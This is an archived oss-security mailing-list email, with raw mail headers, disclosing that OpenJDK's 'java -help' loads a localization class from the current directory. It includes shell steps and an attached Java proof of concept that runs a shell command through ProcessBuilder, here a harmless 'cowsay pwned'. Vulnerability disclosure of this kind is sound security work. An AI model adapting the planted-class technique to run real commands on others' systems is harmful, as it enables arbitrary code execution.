X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1769" "Tuesday" "13" "June" "2017" "17:23:13" "+0200" "Jakub Wilk" "jwilk@jwilk.net" "<20170613152313.te53ju5sh77ptnix@jwilk.net>" "62" "[oss-security] OpenJDK: java(1): untrusted search path" "^Date:" nil nil "6" "2017061315:23:13" "[oss-security] OpenJDK: java(1): untrusted search path" (number mark "        jwilk@jwilk. Jun 13   62/1769  " thread-indent "\"[oss-security] OpenJDK: java(1): untrusted search path\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 32080 invoked by uid 550); 13 Jun 2017 15:23:28 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 32048 invoked from network); 13 Jun 2017 15:23:27 -0000
Message-ID: <20170613152313.te53ju5sh77ptnix@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="5fidj6dfbx3miiuh"
Content-Disposition: inline
User-Agent: NeoMutt/20170306 (1.8.0)
X-Ovh-Tracer-Id: 244038808147187622
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrfeeljedrjeefgdeltdcutefuodetggdotefrodftvfcurfhrohhfihhlvgemucfqggfjpdevjffgvefmvefgnecuuegrihhlohhuthemuceftddtnecu
Date: Tue, 13 Jun 2017 17:23:13 +0200
From: Jakub Wilk <jwilk@jwilk.net>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] OpenJDK: java(1): untrusted search path
To: oss-security@lists.openwall.com

--5fidj6dfbx3miiuh
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Disposition: inline

Running "java -help" can load code from a subdirectory of cwd:

    $ javac launcher_en.java
    $ mkdir -p sun/launcher/resources/
    $ mv launcher_en.class sun/launcher/resources/
    $ java -help
     _______
    < pwned >
     -------
            \   ^__^
             \  (oo)\_______
                (__)\       )\/\
                    ||----w |
                    ||     ||

This happens because:

* By default (i.e. when CLASSPATH env var was unset and neither -cp nor -jar 
was specified), java sets "." as the user class path:
https://docs.oracle.com/javase/8/docs/technotes/tools/findingclasses.html#userclass

* The help message is apparently supposed to be internationalized.

* The Java's localization machinery loads classes:
https://docs.oracle.com/javase/8/docs/api/java/util/ResourceBundle.html


On Debian systems, jarwrapper (a binfmt-misc thing for running executable jar 
files) is affected. It contains the following code:

    if java -d32 2>&1 | grep "does not support" > /dev/null; then
    ...

On 32-bit systems, this causes java to print the help message.

-- 
Jakub Wilk

--5fidj6dfbx3miiuh
Content-Type: text/x-java; charset=us-ascii
Content-Disposition: attachment; filename="launcher_en.java"

package sun.launcher.resources;
import java.util.*;
public class launcher_en extends ListResourceBundle {
    public Object[][] getContents() {
        ProcessBuilder pb = new ProcessBuilder("sh", "-c", "cowsay pwned >/dev/tty");
        try {
            pb.start();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        Runtime.getRuntime().exit(1);
        return null;
    }
}

--5fidj6dfbx3miiuh--
